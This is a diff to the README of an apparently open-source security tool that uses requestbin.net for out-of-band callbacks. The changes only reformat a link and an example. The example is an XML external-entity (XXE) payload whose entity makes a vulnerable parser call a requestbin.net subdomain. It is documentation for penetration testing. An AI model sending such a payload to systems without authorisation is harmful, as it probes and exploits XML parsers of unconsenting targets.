@@ -18,7 +18,7 @@ This tool is part of [secapps.com](https://secapps.com) open-source initiative.
   https://secapps.com
 ```
 
-> **NB**: This tool is taking advantage of requestbin.net service. Future versions will use a dedicated, custom-built infrastructure.
+> **NB**: This tool is taking advantage of http://requestbin.net service. Future versions will use a dedicated, custom-built infrastructure.
 
 ## Quickstart
 
@@ -100,8 +100,7 @@ Using the provided DNS, compose your payload. For example, the following could t
 ```xml
 <!DOCTYPE foo [
 <!ELEMENT foo ANY>
-<!ENTITY bar SYSTEM
-"http://showmethemoney.f92839570333a5d62743.d.requestbin.net">
+<!ENTITY bar SYSTEM "http://showmethemoney.f92839570333a5d62743.d.requestbin.net">
 ]>
 <foo>
 &bar;
